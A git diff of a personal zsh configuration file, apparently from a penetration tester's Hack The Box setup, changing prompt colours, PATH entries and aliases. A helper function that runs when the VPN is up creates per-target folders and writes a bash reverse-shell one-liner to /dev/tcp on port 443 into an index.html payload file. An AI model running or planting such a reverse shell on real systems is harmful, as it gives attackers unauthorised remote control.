@@ -1,18 +1,19 @@
+# ADD as ~/.zshrc
 # Prompt
 if [[ $EUID -ne 0 ]]; then    
-    PROMPT="%F{blue}[%f%F{cyan}$USER%f%F{blue}]%f%F{yellow}─%f%F{red}[%f%F{green}%d%f%F{red}]%f""%F{red}%(?..[%?])%f%F{yellow}> %f"
+    PROMPT="%F{red}[%f%F{purple}$USER%f%F{red}]%f%F{yellow}─%f%F{red}[%f%F{green}%d%f%F{red}]%f""%F{red}%(?..[%?])%f%F{yellow}$ %f"
 else
-   PROMPT="%F{blue}[%f%F{red}$USER%f%F{blue}]%f%F{yellow}─%f%F{blue}[%f%F{green}%d%f%F{blue}]%f""%F{red}%(?..[%?])%f%F{yellow}> %f"
+   PROMPT="%F{red}[%f%F{blue}$USER%f%F{red}]%f%F{yellow}─%f%F{red}[%f%F{green}%d%f%F{red}]%f""%F{red}%(?..[%?])%f%F{yellow}$ %f"
 fi
 
 # Export PATH$
-export PATH=/home/kermit/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kermit/.fzf/bin:/opt/exploitdb:/root/.local/bin:PATH
+export PATH=/home/kermit/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kermit/.fzf/bin:/opt/exploitdb:/root/.local/bin:/home/kermit/scripts/bash:/home/kermit/scripts/python:PATH
 
 # Add as ~/.zshrc
 export ip=$(/usr/bin/cat /home/kermit/.config/bin/target.txt)
 export name=$(/usr/bin/cat /home/kermit/.config/bin/name.txt)
 
-function tgt()
+function ipt()
 {
   echo $ip
 }
@@ -42,7 +43,7 @@ alias dis='dirs -v'
 alias pop='popd'
 alias pus='pushd'
 # Alias's for multiple directory listing commands
-alias la='lsd -Alh' # show hidden files
+alias la='lsd -Aalh' # show hidden files
 alias ls='lsd -aFh --color=always' # add colors and file type extensions
 alias lx='lsd -lXBh' # sort by extension
 alias lk='lsd -lSrh' # sort by size
@@ -313,17 +314,16 @@ if [ "$IFACE" = "tun0" ]; then
   echo "$ip_address" > /home/kermit/.config/bin/target.txt
   echo "$nombre_maquina" > /home/kermit/.config/bin/name.txt
 
-  echo "\n\n\t${green}[+]${endcolor} Creando directorios de trabajo..."
+  echo -e "\n\n\t${green}[+]${endcolor} Creando directorios de trabajo...\n"
   mkdir /home/kermit/maquinas/$nombre_maquina
   mkdir /home/kermit/maquinas/$nombre_maquina/content
+  mkdir /home/kermit/maquinas/$nombre_maquina/recon
   touch /home/kermit/maquinas/$nombre_maquina/scan
   touch /home/kermit/maquinas/$nombre_maquina/credentials
   touch /home/kermit/maquinas/$nombre_maquina/index.html
   chmod o+x /home/kermit/maquinas/$nombre_maquina/index.html
   echo -ne "#!/bin/bash \n\n bash -i >& /dev/tcp/$htb_ip/443 0>&1" > /home/kermit/maquinas/$nombre_maquina/index.html
-  sudo su
-  pushd /home/kermit/
-  pushd /home/kermit/maquinas/$nombre_maquina
+  cd /home/kermit/maquinas/$nombre_maquina
   echo "\n"
   lsd -la
   echo "\n\n"
